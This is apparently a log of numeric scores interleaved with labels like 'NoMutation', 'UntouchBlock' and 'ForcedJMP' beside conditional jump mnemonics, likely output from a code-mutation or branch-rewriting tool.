;0.857330693223
;UntouchBlock_0
;1.37403366966
;		JNZ 	_0
;1.62840529806
;1.5392212313
;0.772381690612
;0.943411047061
;		JNZ 	_1
;0.68713347262
;1.28587635972
;1.28694396035
;0.508627290173
;NoMutation
;1.11299189353
;NoMutation
;0.685903703539
;1.11209101046
;0.600648980859
;0.856535243261
;NoMutation
;1.02825803781
;0.601026853817
;0.345798734349
;1.0278963658
;0.857004071437
;1.19727737864
;1.11024707643
;0.514048754192
;NoMutation
;1.10844034789
;0.770611895981
;0.34163541292
;UntouchBlock_1
;0.937425977981
;0.598418168654
;0.937731191372
;1.10918477394
;0.67826355869
;UntouchBlock_1
;0.935805489329
;		JZ 	_0
;1.10789894381
;0.767460913479
;0.428174752293
;1.01495721606
;UntouchBlock_1
;0.764382688857
;1.10496973589
;0.846252959946
;1.18466758288
;UntouchBlock_0
;0.342309974888
;0.928373831902
;		JZ 	_1
;0.761191690599
;0.506450157382
;0.926157766379
;1.17721475473
;0.504955504207
;1.09174460278
;UntouchBlock_0
;0.58933142118
;1.08973572397
;1.17012420721
;0.503194687075
;0.919162861906
;0.504243872542
;0.171098297855
;0.919093677994
;NoMutation
;1.16819075641
;0.580741165874
;		JNZ 	_0
;0.917904726313
;UntouchBlock_1
;0.750225655749
;0.999887036832
;0.8303342031
;1.16401094314
;		JNZ 	_0
;0.745574002078
;0.416175835544
;0.995876767871
;1.24381964677
;0.74679261763
;0.911538216245
;NoMutation
;0.581587149534
;0.828328472799
;1.07750136226
;NoMutation
;0.829268997784
;0.829016730558
;0.498551989997
;0.911859298176
;UntouchBlock_1
;0.663849400968
;1.07752477049
;0.829180677105
;0.663342143928
;0.332116653207
;0.992726919346
;NoMutation
;1.32142820887
;UntouchBlock_0
;0.66239569501
;0.330733434873
;NoMutation
;0.246916375649
;NoMutation
;0.90639683946
;UntouchBlock_0
;1.31348462539
;0.738436486455
;0.491128090172
;0.984764987676
;0.576797853773
;0.332016995375
;0.90518214132
;0.331210681398
;NoMutation
;0.411359829462
;NoMutation
;0.904362549572
;0.659685132482
;0.905549310911
;NoMutation
;0.822929437252
;0.823204361114
;NoMutation
;0.412084296548
;NoMutation
;0.985123585403
;1.22877828444
;1.3923661987
;UntouchBlock_1
;0.740009227435
;0.575552431277
;0.978797400491
;1.221611222
;0.729222795465
;		JNZ 	_0
;0.811454201722
;1.13547392434
;0.483990585792
;0.892382186023
;		JZ 	_0
;1.13513243154
;UntouchBlock_0
;0.649475393772
;NoMutation
;1.13589368675
;1.37985332568
;0.568437880486
;0.811337053705
;NoMutation
;0.811829516261
;0.568392385803
;NoMutation
;0.568527625528
;0.811226442341
;0.568395044926
;0.972972590155
;0.81046736774
;0.324935564052
;0.809417599597
;NoMutation
;1.13069262068
;1.12798665534
;0.644780851624
;0.644876181774
;0.966749544913
;		JNZ 	_0
;0.725499963317
;0.805442682431
;1.12834177179
;ForcedJMP_1
;0.645657910604
;0.966820913028
;NoMutation
;1.20793766561
;0.725969647697
;0.966834320592
;0.805214823265
;0.804201709934
;0.80276563603
;0.966604613813
;UntouchBlock_1
;0.802697652701
;NoMutation
;0.563821285624
;0.797825545679
;0.801823711882
;1.11945921408
;UntouchBlock_0
;0.721415037011
;1.19547379216
;0.720027135043
;0.877710775436
;1.19240495729
;0.721530753212
;0.958901537581
;0.798724482385
;NoMutation
;0.480814156217
;0.798023670077
;0.798159255378
;0.795207460122
;0.633348668228
;		JZ 	_0
;1.03160540459
;NoMutation
;0.712658672399
;0.791627699333
;		JNZ 	_0
;0.793184744413
;UntouchBlock_1
;1.0308398384
;0.635754138592
;1.11201460763
;NoMutation
;0.475986636773
;UntouchBlock_1
;0.951589939447
;1.10929478988
;0.793250075658
;0.55643718108
;1.10818041545
;0.792415301413
;NoMutation
;0.398676313093
;0.870488985488
;0.947231879901
;0.552398670395
;0.471413217304
;0.786948102494
;1.10302065815
;		JZ 	_0
;0.629444860289
;0.787127683518
;1.10359552833
;ForcedJMP_0
;0.552521821521
;1.02485409533
;ForcedJMP_1
;1.17984826794
;1.33628177924
;0.707910974191
;NoMutation
;0.551773986496
;0.943435550268
;1.33295665903
;0.707110849154
;0.780266909406
;1.01485939762
;0.622747719215
;0.308751700815
;0.386922979017
;0.857738742537
;0.623341178568
;NoMutation
;0.388473641156
;0.859190114271
;UntouchBlock_0
;1.09040849351
;0.704587704087
;0.548976075421
;0.471757280929
;1.01259622715
;NoMutation
;1.16904520432
;1.24463036949
;0.70279840068
;0.468449200669
;0.934566202456
;0.624386944139
;0.933572067094
;UntouchBlock_1
;0.70173934136
;1.0109249407
;0.701740603693
;0.778637976947
;0.620510699039
;0.930454086767
;ForcedJMP_0
;1.08338115204
;1.31493814356
;NoMutation
;0.698092271714
;0.773752579621
;0.926104477057
;1.15906524741
;		JNZ 	_0
;1.23293382392
;0.61778979281
;0.463555454147
;0.38620423048
;0.847102044452
;0.540246710936
;0.845958505766
;0.768466033018
;1.14936087873
;0.538008910947
;0.386939873208
;0.30949225039
;0.846676680239
;NoMutation
;0.922728111506
;0.538720022768
;0.998885244712
;1.07444609186
;NoMutation
;1.15006921906
;0.463121070981
;0.919544116134
;		JZ 	_1
;0.462067419047
;0.919374507733
;0.537650515824
;0.996952488262
;NoMutation
;0.537934690502
;0.766978195661
;0.462053818482
;0.843761216206
;0.765057995216
;0.459132322072
;0.992357002397
;1.06760347001
;0.763810793919
;NoMutation
;0.535681998801
;0.913000544487
;0.608697496941
;0.836273819182
;UntouchBlock_1
;0.609928318489
;0.529968819793
;0.833028036711
;0.829876172966
;UntouchBlock_0
;0.677641285505
;NoMutation
;0.525674448537
;NoMutation
;0.827885253309
;0.372484259919
;ForcedJMP_1
;0.82945595407
;0.526882388699
;0.909104701348
;UntouchBlock_0
;1.21355799786
;NoMutation
;0.683441554327
;NoMutation
;0.229226467381
;0.833149171992
;NoMutation
;0.381459402276
;0.910042267417
;0.757892533955
;0.756998990857
;0.754696608459
;0.751414824113
;0.746258875373
;1.04329644627
;0.598810823553
;0.825602173289
;0.747771569606
;0.526382978642
;0.816861405769
;0.745423216405
;0.67184350802
;0.895358861994
;NoMutation
;0.602998135043
;1.12115469816
;UntouchBlock_0
;0.744126867908
;		JNZ 	_0
;1.12320062452
;0.672731879209
;0.819008815573
;0.667498794534
;0.743727379105
;NoMutation
;0.446704325474
;0.890683321768
;0.444755115282
;NoMutation
;0.888338752497
;0.44278934932
;NoMutation
;0.443208333308
;0.812496165387
;ForcedJMP_0
;0.95931068009
;UntouchBlock_0
;0.590446876119
;0.812173312062
;0.445016112908
;0.811235807321
;1.25356414438
;1.32335077239
;1.39488893931
;1.3136519979
;0.656143547662
;0.87250161964
;		JNZ 	_0
;0.443058376521
;0.291879891051
;0.875033655237
;NoMutation
;0.510296172076
;0.798567888947
;0.946135997378
;NoMutation
;0.582860030486
;0.870536295191
;0.507379167567
;NoMutation
;0.363656896723
;0.874197055307
;NoMutation
;0.506680904501
;UntouchBlock_0
;1.01590540418
;0.581922731064
;0.726418271185
;0.508935461805
;0.798377508093
;0.726255828618
;1.0872804472
;0.653404439578
;0.508995633312
;0.798048541496
;0.581187343628
;0.364161548793
;0.723373078158
;0.361873392842
;0.794301509042
;1.00937678461
;0.576140675286
;NoMutation
;0.720315540635
;UntouchBlock_0
;0.43317882741
;0.936985586666
;0.577382583111
;1.0796068323
;0.647607265559
;1.14853071071
;0.647985555394
;NoMutation
;0.936583845949
;1.08012270794
;0.717332443709
;0.357837353094
;0.861400867943
;UntouchBlock_0
;0.502021621095
;0.93202773885
;UntouchBlock_1
;0.503647813839
;0.786905798323
;0.932832888567
;0.649299867446
;UntouchBlock_0
;0.290175484094
;0.785233998744
;0.502714586076
;0.285714649946
;NoMutation
;0.92509662472
;NoMutation
;0.573450040777
;0.923976120113
;		JZ 	_0
;0.571485571566
;0.28681113847
;0.780641221426
;0.637873505529
;0.779185522649
;1.06053403035
;0.639011073241
;0.358400577975
;0.144035324369
;0.85253640273
;0.570275610586
;0.922196464783
;0.427525220968
;0.792639289937
;NoMutation
;1.06867808699
;0.639464104068
;1.05696440714
;0.70698431479
;NoMutation
;0.354492729574
;UntouchBlock_1
;0.773891316551
;0.566570236108
;UntouchBlock_1
;0.494857771748
;0.910593487257
;NoMutation
;0.981984157291
;UntouchBlock_0
;0.628555856086
;UntouchBlock_0
;0.421724228375
;0.904303433945
;		JZ 	_0
;0.490441033016
;0.281925386225
;0.837638217468
;0.975400635636
;0.631133218207
;0.560474309134
;NoMutation
;0.697470810809
;0.698997032647
;NoMutation
;0.491491879992
;0.697735713275
;1.05516207276
;NoMutation
;0.698370571794
;UntouchBlock_0
;0.981830684259
;NoMutation
;1.04732769422
;NoMutation
;0.420706134135
;0.832898912004
;0.624159573815
;NoMutation
;0.966778082967
;0.61882104352
;0.894208894417
;0.633040628002
;UntouchBlock_0
;0.903684100305
;0.802898649706
;0.729052712627
;UntouchBlock_0
;1.04563293617
;0.69490045556
;0.896015768594
;1.02612374854
;0.960256710378
;0.745548817204
;UntouchBlock_0
;0.818141746376
;NoMutation
;0.80743825391
;1.03360658536
;		JNZ 	_0
;0.852769814609
;0.667701408971
;0.413634707788
;0.893577316923
;0.954375547174
;UntouchBlock_1
;0.796090919383
;0.867713960633
;0.872325317768
;NoMutation
;1.37826142564
;0.93811740225
;1.18382337227
;0.826753589912
;0.529550895279
;NoMutation
;1.09868821986
;NoMutation
;0.845069155758
;0.885278046252
;NoMutation
;0.702396397215
;NoMutation
;0.902429639998
;UntouchBlock_0
;0.712751298591
;NoMutation
;0.784277740104
;0.862732155309
;0.949459232506
;0.946537534637
;0.791095204859
;0.616102343436
;0.852164121841
;0.616881088623
;1.02107589263
;0.63603669649
;0.683763744255
;0.789523722264
;0.936659590758
;NoMutation
;1.10129300315
;0.785927275873
;NoMutation
;0.822783773806
;		JNZ 	_0
;0.737658230147
;1.09279660632
;0.847442737895
;0.890012252006
;0.785285186834
;1.26016400801
;0.929502261331
;0.684750491665
;1.00708019443
;0.701297764782
;0.851215214647
;UntouchBlock_0
;0.775269256449
;0.740706344641
;0.828009065168
;0.841683904638
;0.648460136808
;0.850454323212
;0.632102350514
;UntouchBlock_0
;0.878673151069
;0.689708597534
;1.02567128092
;0.914754777229
;0.852293477509
;UntouchBlock_0
;0.912944159917
;0.841223481362
;1.18034214025
;0.767642949351
;1.02546599282
;0.697123283254
;0.721706614653
;0.830902336512
;NoMutation
;0.785913013134
;0.899829691935
;0.60825415475
;UntouchBlock_1
;0.678344583842
;0.977623375782
;0.667748240455
;0.581625784076
;0.581358879895
;0.740578383835
;0.917207208742
;UntouchBlock_0
;0.698820191879
;0.990409394678
;		JNZ 	_0
;0.879497216531
;0.710065487
;1.14366227953
;NoMutation
;1.02271434528
;0.663551582893
;NoMutation
;0.920817295408
;0.774745963503
;UntouchBlock_0
;0.72984313387
;NoMutation
;0.735666835898
;0.710448544804
;0.914813082483
;NoMutation
;0.970759476369
;NoMutation
;0.822427762385
;0.834265779287
;0.947344994546
;0.714586187837
;0.887789453321
;0.657734167025
;0.654237373507
;NoMutation
;0.972038445799
;1.01352855824
;		JNZ 	_0
;0.68484315707
;1.12653121442
;NoMutation
;1.20590201176
;1.12083513012
;0.508473400056
;0.860814329536
;0.817722427737
;1.48811558354
;		JZ 	_0
;1.02331930375
;0.611826909705
;0.453603601148
;0.713006098856
;0.970028709647
;0.633710904518
;0.684790765986
;0.712093814377
;NoMutation
;0.740661311163
;0.784998234495
;NoMutation
;0.817409903928
;0.549815153802
;0.47214780938
;0.767667757895
;0.9228890358
;0.618207637326
;0.918324464828
;0.675280775478
;0.314461884936
;0.869306223921
;NoMutation
;0.576373022911
;0.662133082709
;		JNZ 	_1
;0.726998376653
;0.856073806426
;0.832657681712
;0.83164900965
;0.997105340825
;1.19736869268
;0.583351338634
;0.991264093513
;UntouchBlock_0
;0.774104420839
;0.757343297797
;UntouchBlock_1
;0.847876104331
;0.83924540357
;0.781673753266
;0.697865347008
;0.60750923366
;1.00530378597
;0.770671277328
;		JNZ 	_0
;0.913157925376
;0.775313981375
;0.898014102504
;0.858625773859
;UntouchBlock_1
;0.569710025018
;0.684626601364
;0.739693444412
;0.634022700623
;0.786323651773
;0.594077461705
;0.850672452322
;NoMutation
;0.694377101678
;0.705703728365
;0.674842690347
;0.754724992601
;UntouchBlock_0
;0.464065609968
;0.817134891994
;		JNZ 	_0
;0.700448835076
;UntouchBlock_1
;0.814873482632
;0.918930024675
;ForcedJMP_0
;0.682714341316
;0.70577958026
;0.576431723701
;0.612366097949
;0.756532480927
;0.794374605826
;UntouchBlock_1
;0.753980015246
;0.717630364978
;0.665888127446
;0.495568830621
;0.820141401925
;0.624887895562
;0.702556521309
;0.808471511879
;0.807224379795
;ForcedJMP_1
;0.743581556514
;0.828324608949
;0.506040532808
;ForcedJMP_1
;0.74569801499
;0.55040066275
;0.746782775312
;NoMutation
;0.923617175634
;0.632648499893
;0.66096695932
;UntouchBlock_0
;0.708721644016
;		JZ 	_1
;0.811056663412
;0.669262464114
;0.751402989928
;NoMutation
;0.600899909735
;0.678853559954
;0.584820526801
;		JZ 	_1
;0.688377645263
;0.520709307887
;0.823340287436
;0.693420678244
;0.955923608292
;		JNZ 	_0
;0.665383655144
;NoMutation
;0.855618709418
;0.565730871579
;0.861821221866
;0.788163459217
;0.840403372291
;0.531637166986
;ForcedJMP_1
;0.737112046897
;0.866514670807
;0.756177277837
;NoMutation
;0.631467651729
;0.734484083599
;0.522265806479
;0.783414568928
;0.455078124883
;0.457952111291
;0.461519094653
;0.513425054473
;0.587873403713
;0.658868059443
;0.447599930337
;0.678299435711
;0.709508944682
;0.727582143452
;NoMutation
;0.674412242118
;1.30552732578
;UntouchBlock_0
;0.862094551364
;0.315591292976
;0.846168468571
;UntouchBlock_0
;0.646033715893
;0.973013527534
;1.07519668083
;NoMutation
;0.91203452479
;NoMutation
;0.923361303762
;0.59838896317
;UntouchBlock_1
;0.556492657339
;0.75250126306
;0.750247576912
;0.540691086239
;0.530378689026
;0.582729597682
;0.532773622591
;0.650885417494
;0.583780113499
;0.633943290435
;NoMutation
;0.759009556841
;NoMutation
;0.694908718951
;0.700750448119
;		JZ 	_1
;0.49646641808
;0.76757119089
;0.820435298368
;0.617085518528
;NoMutation
;0.510633402249
;0.675573763505
;0.697827591885
;0.580997899664
;UntouchBlock_1
;0.918211086406
;0.998290170019
;0.572577010592
;UntouchBlock_1
;0.746062164596
;UntouchBlock_1
;0.886006246184
;0.563485877743
;ForcedJMP_0
;0.717618347043
;0.662133778135
;ForcedJMP_1
;0.520725525736
;0.631562789409
;UntouchBlock_1
;0.604782195077
;0.671941853159
;0.635782575878
;UntouchBlock_1
;0.674904794483
;0.593459637805
;0.793241003249
;0.362910687751
;UntouchBlock_0
;0.321642162247
;0.664718182226
;0.836116682419
;NoMutation
;0.921160791661
;0.536669805043
;0.650164689872
;0.720825408907
;NoMutation
;0.488904203393
;UntouchBlock_0
;0.842976036269
;UntouchBlock_1
;0.916133445258
;0.456144315949
;0.50944374375
;0.527263213067
;0.593110398324
;0.674195223179
;		JZ 	_0
;0.528412463399
;0.613113597574
;0.505384397141
;0.646942178698
;0.649321380337
;0.779420118714
;0.522263773523
;0.59494328063
;0.759055428634
;0.568668750529
;0.589292144455
;0.364797427143
;NoMutation
;0.811069143961
;0.644588494167
;0.667401444094
;UntouchBlock_0
;0.606809207631
;0.331071544424
;0.480603668953
;0.643307264205
;0.507428014762
;0.811684230737
;UntouchBlock_1
;0.509630370184
;		JNZ 	_0
;0.834708982078
;0.51309421121
;		JZ 	_0
;0.700878606169
;0.898290962837
;		JZ 	_1
;0.555222168332
;0.694408956307
;0.544399537056
;0.568543449697
;0.673088100725
;0.603683991165
;0.364690974512
;UntouchBlock_1
;0.605864401931
;0.622714289261
;0.645265023296
;1.0100625417
;0.749650589914
;0.75405858158
;1.34787335956
;		JZ 	_1
;0.646938708964
;UntouchBlock_0
;0.55909612914
;0.61136517381
;0.932896336839
;0.490389578778
;0.713387020229
;UntouchBlock_0
;0.549939135913
;0.83584354561
;UntouchBlock_0
;0.646948063439
;0.727801419662
;0.491750358922
;0.415237449576
;UntouchBlock_0
;0.638118330928
;0.602893616827
;0.718254481688
;0.601064402629
;0.351592312079
;0.451307844187
;0.375283270666
;0.596093993991
;0.701258754155
;UntouchBlock_0
;0.713963060305
;0.751921224262
;0.461503445642
;0.421783714098
;0.535624476838
;0.59925052753
;0.553859317954
;0.560690472101
;UntouchBlock_0
;0.552937694339
;0.932544649019
;UntouchBlock_0
;0.577694121907
;0.553143788743
;0.515405297566
;0.493622928203
;NoMutation
;0.443227375634
;0.57441214238
;0.566193034253
;0.521401116135
;0.641190536561
;0.577881941809
;0.347956092642
;0.635432669613
;NoMutation
;0.617763586883
;NoMutation
;0.645010945217
;0.515936956127
;0.379682202066
;0.66631099127
;UntouchBlock_1
;0.660673865336
;0.463569510205
;UntouchBlock_0
;0.574010201626
;NoMutation
;0.421179447389
;0.673418602947
;0.602823161409
;NoMutation
;0.620317119068
;0.602740993811
;0.392581765438
;UntouchBlock_1
;0.442078555908
;0.610529938342
;0.620634474079
;NoMutation
;0.499133701436
;0.718897547432
;0.725891391489
;		JZ 	_0
;0.649559931546
;0.510193254009
;0.45927339869
;0.654541174633
;NoMutation
;0.506586060779
;		JNZ 	_0
;0.759558161298
;0.591437143303
;0.631360219443
;UntouchBlock_1
;0.349310742557
;0.414861412328
;ForcedJMP_1
;0.506397467437
;0.69844074194
;0.413132982393
;NoMutation
;0.402484522096
;0.56661259405
;NoMutation
;0.691916554651
;0.391645389491
;0.627996588269
;0.430372146369
;UntouchBlock_0
;0.667047300456
;UntouchBlock_1
;0.636077459472
;0.464146466811
;0.524602709103
;0.391752603707
;0.597250361272
;0.465039271457
;		JNZ 	_1
;0.667558321748
;0.410051201913
;0.520201199236
;0.467194975191
;0.370744475584
;ForcedJMP_0
;0.480034211018
;ForcedJMP_1
;0.410216350981
;0.445251974121
;0.581404843881
;		JZ 	_0
;0.487327813888
;0.605359325443
;NoMutation
;0.499512467891
;0.48567189631
;		JNZ 	_1
;0.588328183976
;0.276042255554
;0.521037323242
;NoMutation
;0.634699040622
;		JNZ 	_0
;0.475987488632
;0.432080341239
;NoMutation
;0.294999149799
;0.742518432899
;UntouchBlock_0
;0.475090514536
;0.463396157621
;0.540970150226
;ForcedJMP_0
;0.381047574396
;UntouchBlock_1
;0.315406080375
;NoMutation
;0.32018539084
;0.637733395011
;0.662223136889
;UntouchBlock_0
;0.398065042636
;0.477189485842
;0.481010113073
;0.451640363896
;0.499467356373
;0.732247642237
;0.416802451218
;0.261857736388
;		JNZ 	_0
;0.325944062136
;0.627932417523
;UntouchBlock_0
;0.415190128849
;0.446424072512
;0.478356039883
;		JNZ 	_0
;0.776539207887
;0.399210540788
;0.377179164987
;0.518438095795
;0.324489371796
;0.515845365984
;NoMutation
;0.46957976901
;0.469926583869
;0.450043480791
;0.474152644764
;0.367390320528
;0.553719917363
;0.464262170957
;ForcedJMP_0
;0.456520252526
;0.469431533156
;0.384154212715
;0.351668590167
;0.422282349194
;NoMutation
;0.342996701275
;0.293172833775
;NoMutation
;0.472356263813
;0.405977387018
;0.31699996488
;0.511920177625
;0.349144048916
;0.421090390876
;0.354009565117
;UntouchBlock_1
;0.324983213839
;0.349614098676
;ForcedJMP_1
;0.38747387911
;0.434267002907
;		JZ 	_0
;0.405391941289
;UntouchBlock_0
;0.651723021598
;NoMutation
;0.394721160769
;0.405779428305
;UntouchBlock_0
;0.359489110534
;0.503737174281
;ForcedJMP_1
;0.398689950516
;0.471974229398
;0.222685079929
;NoMutation
;0.396003736885
;0.365727734154
;		JNZ 	_0
;0.324632747847
;NoMutation
;0.46560041238
;0.298341582775
;0.545279899625
;		JZ 	_1
;0.64994661308
;0.380653904454
;0.404347194728
;0.31665622997
;0.447979977066
;ForcedJMP_0
;0.315030186193
;NoMutation
;0.36243787069
;0.61550916326
;0.512560173923
;ForcedJMP_0
;0.506110649703
;0.376631763307
;0.273872430183
;NoMutation
;0.337125863004
;0.438557118646
;NoMutation
;0.323347509349
;		JZ 	_0
;0.292412746142
;0.381499099626
;0.360012709044
;0.335938527744
;UntouchBlock_1
;0.403139181486
;0.30357763381
;0.41712738263
;0.293178948175
;0.34089108696
;NoMutation
;0.418989055964
;0.343257878341
;		JNZ 	_0
;0.312004194287
;0.29783707369
;0.244447403859
;NoMutation
;0.360172691126
;0.261165608941
;0.343932119273
;0.362870046027
;NoMutation
;0.315087955097
;UntouchBlock_1
;0.25683841056
;0.340667017375
;0.313440508672
;NoMutation
;0.281084350718
;0.336976883447
;ForcedJMP_0
;0.244493939982
;NoMutation
;0.333286019828
;0.253612660136
;0.300746819265
;UntouchBlock_0
;0.431198909182
;		JZ 	_1
;0.236871395797
;0.402615667315
;0.38323661788
;NoMutation
;0.408893271215
;0.302614726684
;0.340942432101
;0.334078886818
;0.120281802186
;0.212529581114
;0.263460464927
;ForcedJMP_0
;0.256844245557
;0.193532311043
;0.310202527661
;NoMutation
;0.403411083265
;0.259950476435
;0.219952050368
;0.188803870915
;NoMutation
;0.271336877985
;0.337165599058
;NoMutation
;0.257111904264
;0.175255372411
;0.241306119666
;0.260227472939
;0.189322922515
;UntouchBlock_0
;0.252962912633
;0.185255145478
;		JZ 	_1
;0.239521562106
;		JNZ 	_1
;0.224847381628
;0.185250628916
;		JZ 	_0
;0.204550088265
;0.149372324447
;0.221813419357
;UntouchBlock_0
;0.179588000652
;0.223058430064
;ForcedJMP_1
;0.121336701191
;UntouchBlock_1
;0.168212368235
;NoMutation
;0.129979394184
;UntouchBlock_0
;0.152972125264
;UntouchBlock_1
;0.122599443933
;UntouchBlock_1
;0.176015782735
;0.182487217636
;0.204702991055
;0.148843521158
;0.182839639446
;0.1722259531
;0.147853777263
;0.122330853369
;0.221957970001
;0.166844366987
;0.159552453772
;0.16141957516
;0.141426014302
;		JNZ 	_1
;0.144602551097
;0.115377030326
;UntouchBlock_1
;0.157337640358
;NoMutation
;0.141355370374
;0.213456507827
;0.143029028843
;0.154276081033
;0.114036805727
;UntouchBlock_0
;0.193629337411
;		JNZ 	_0
;0.109122022906
;NoMutation
;0.0819441293428
;		JZ 	_0
;0.098487751284
;NoMutation
;0.0775152825256
;		JNZ 	_0
;0.0954499948656
;0.094168740877
;ForcedJMP_1
;0.0717328176227
;UntouchBlock_0
;0.0766820482273
;0.129668822183
;0.0826207312944
;0.065695863068
;UntouchBlock_0
;0.0728843448266
;UntouchBlock_1
;0.0750382061
;0.0708195896814
;0.0388179657429
;UntouchBlock_0
;0.063489682197
;NoMutation
;0.0472441317117
;UntouchBlock_1
;0.0351072933477
;0.0428421505275
;0.0353205324404
;ForcedJMP_0
;0.026230106506
;0.0132662612049
;		JZ 	_0
;1.0096443945
;0.368845653393
;NoMutation
;1.00567694134
;0.462781607352
;1.00702662962
;0.913799886537
;0.459798723626
;0.998095026759
;NoMutation
;0.817171540223
;UntouchBlock_1
;0.456007610435
;0.907963470062
;0.370116638628
;0.279420502227
;0.188372264144
;NoMutation
;1.00157704374
;1.36363442782
;UntouchBlock_1
;0.816640482914
;0.819675353354
;0.638164184309
;1.36272099197
;1.00119226844
;1.09263385486
;1.18266372134
;1.35866124782
;1.53480966734
;0.186522114444
;NoMutation
;0.364450574626
;0.629260572359
;0.719976214972
;1.07161789879
;0.80499892635
;0.898333985899
;0.891446244236
;1.42991676411
;0.260719394803
;0.442630886769
;ForcedJMP_0
;0.976987000689
;0.888063962517
;0.886370396946
;0.53602977598
;0.355511767026
;0.711163538046
;0.618103879648
;UntouchBlock_1
;0.973231670671
;NoMutation
;1.2272482838
;0.619964822537
;0.874567374224
;1.136576115
;0.528641212344
;0.530316903978
;UntouchBlock_0
;1.134914656
;1.14051068136
;0.96310678705
;0.703573913094
;0.877752412883
;0.878036453116
;NoMutation
;0.443120341679
;0.965542030396
;0.441097422175
;0.963507388251
;0.43950665986
;0.950684886272
;0.693624761517
;0.693443954299
;1.47010672616
;		JZ 	_1
;0.523346133844
;1.37381144301
;0.948914609177
;UntouchBlock_1
;1.3789079051
;0.264046994839
;0.684756125423
;UntouchBlock_1
;1.2733191324
;1.10688714299
;1.26823213316
;1.20065696583
;0.520940108636
;0.681907351475
;1.18974883002
;0.934028032646
;NoMutation
;0.683266257945
;0.931456057205
;UntouchBlock_1
;1.09182864304
;		JNZ 	_0
;0.683404865886
;UntouchBlock_1
;0.35020429456
;0.933137485636
;NoMutation
;0.599162251798
;0.681969140615
;0.845584575768
;0.513646525111
;0.596022196649
;0.343243532794
;NoMutation
;1.01983317041
;0.511205774742
;NoMutation
;1.10276309689
;1.26834992644
;0.932917626883
;1.1845881424
;1.01406225307
;		JNZ 	_1
;1.09761053072
;NoMutation
;0.763603733995
;1.01774628744
;0.427847811983
;1.35319229396
;0.259831329546
;0.160383003186
;		JZ 	_1
;0.932830791614
;0.848970320242
;0.509999476432
;1.51283364466
;0.265525226939
;0.925024600498
;1.09878453998
;1.15003049265
;1.17886396581
;0.910264375643
;UntouchBlock_0
;1.25428208527
;0.25928758571
;		JZ 	_0
;1.0027896038
;0.852532227401
;NoMutation
;1.10749746622
;1.03165225669
;1.02912668111
;1.26204032457
;0.763460143706
;ForcedJMP_0
;1.29597820944
;NoMutation
;0.759718209754
;ForcedJMP_0
;1.03941896737
;NoMutation
;1.06098423574
;NoMutation
;0.720122536941
;0.963946767706
;UntouchBlock_1
;1.18488210665
;0.569526762711
;1.02192337897
;0.846860900926
;ForcedJMP_0
;0.637947319513
;1.51300378742
;1.07541396147
;1.16658056626
;ForcedJMP_0
;1.14024407713
;1.1513661488
;1.39400315442
;0.983834854843
;1.26331443034
;0.854092038652
;0.892942844178
;1.1855028729
;1.00316947028
;1.0698009135
;1.64218516723
;1.288378933
;1.43285836543
;ForcedJMP_1
;1.00130020227
;1.58419832365
;NoMutation
;1.09654340691
;1.13803335118
;1.05062235534
;NoMutation
;1.48065341465
;1.08816937396
;UntouchBlock_1
;1.08995969402
;1.47062729244
;		JZ 	_0
;0.881780063871
;1.43819213346
;NoMutation
;0.839379087363
;UntouchBlock_1
;0.954295508501
;1.25897471841
;1.40084438681
;1.20338059364
;NoMutation
;1.38702837505
;1.32659565824
;0.896251512222
;1.31795459722
;1.18474096975
;1.21341363182
;0.685454169827
;1.20345063224
;1.27464490746
;UntouchBlock_1
;1.11376239688
;UntouchBlock_0
;0.834766192254
;1.18638957261
;1.45066000598
;		JNZ 	_1
;1.09814131452
;1.00328506317
;1.43136110833
;1.28944994603
;		JNZ 	_0
;1.47971968169
;1.12641078182
;UntouchBlock_0
;1.21060226441
;1.2699165711
;1.33123524318
;ForcedJMP_0
;1.33606724399
;NoMutation
;1.39983214869
;NoMutation
;1.08972861368
;1.37344450918
;UntouchBlock_1
;1.66378490146
;NoMutation
;1.11746944046
;1.20283575783
;1.11550463246
;1.21288442548
;0.975764139737
;1.36351420863
;1.85124968362
;1.01904105171
;ForcedJMP_0
;1.07078675234
;0.93390170571
;1.20138709401
;1.24930683133
;1.17109221239
;NoMutation
;1.03951046568
;1.12368487792
;0.906951522696
;1.51431604089
;0.9981944711
;0.723777559691
;1.2830881226
;0.945928271249
;1.25255486923
;1.07484840659
;1.17957442734
;1.25238467314
;		JNZ 	_0
;1.0506983639
;1.15017610502
;UntouchBlock_1
;0.996809950243
;UntouchBlock_0
;0.915471123463
;1.03210235902
;1.1741950127
;		JNZ 	_0
;1.11600100793
;0.99373200686
;0.839184796165
;1.13863099471
;0.907423989202
;1.21525102149
;2.00258982321
;1.354355932
;1.53612862626
;1.05140498245
;1.20547711527
;1.09610836752
;NoMutation
;1.0223260843
;		JNZ 	_0
;1.25579464736
;1.4899343922
;ForcedJMP_1
;1.2256393573
;		JZ 	_0
;1.51099232551
;0.924026498576
;1.3524977656
;UntouchBlock_0
;1.19086869655
;1.20515391962
;0.906201931268
;1.2431925093
;0.970330471255
;1.14567339775
;		JNZ 	_0
;1.10933806966
;1.22826464518
;0.8692120631
;1.40844387816
;1.45546962578
;1.2143217861
;1.03312478453
;UntouchBlock_1
;1.72929451422
;UntouchBlock_0
;1.12839837135
;1.1549614076
;1.19114946909
;0.963827488842
;UntouchBlock_0
;0.984403129192
;1.52425275399
;		JNZ 	_0
;0.950583909763
;0.978990527439
;1.30863899518
;ForcedJMP_0
;1.73867194088
;UntouchBlock_0
;1.05469836506
;ForcedJMP_1
;1.06920765317
;1.03364169056
;1.11615739265
;1.0884090428
;1.48008558491
;ForcedJMP_0
;1.31039578817
;1.5318738744
;ForcedJMP_0
;1.58910199385
;UntouchBlock_0
;1.04959341164
;NoMutation
;1.33304891832
;1.41785439743
;NoMutation
;0.951411209977
;		JNZ 	_1
;1.05628450884
;1.13261423332
;1.03243024746
;1.13201241344
;1.21052220881
;1.13078169911
;1.08966703194
;1.59067513445
;		JZ 	_1
;1.46378644295
;1.42019577132
;1.00354069924
;0.974121647573
;1.4279131792
;NoMutation
;1.01451979919
;1.10767707852
;1.14178191439
;0.964233783212
;1.55402164212
;1.19405364945
;UntouchBlock_1
;1.19217806158
;1.20752439841
;1.09034962703
;1.04362512072
;1.30680699506
;0.924900010151
;1.43378379529
;1.34235145524
;0.984300044999
;		JZ 	_1
;1.10523014051
;1.00612103639
;1.00304765691
;1.27214240408
;0.80194826858
;UntouchBlock_0
;1.03699470209
;ForcedJMP_0
;0.772308133104
;0.882868587677
;1.40245490881
;1.07341176024
;UntouchBlock_1
;1.25632250214
;0.926017765019
;1.30832887507
;0.914991195913
;0.965351476284
;1.15923252829
;1.42405413709
;1.65834510179
;0.916412140987
;1.2057908144
;1.25850950951
;		JNZ 	_1
;1.16059204955
;ForcedJMP_1
;1.17527202785
;0.997883803499
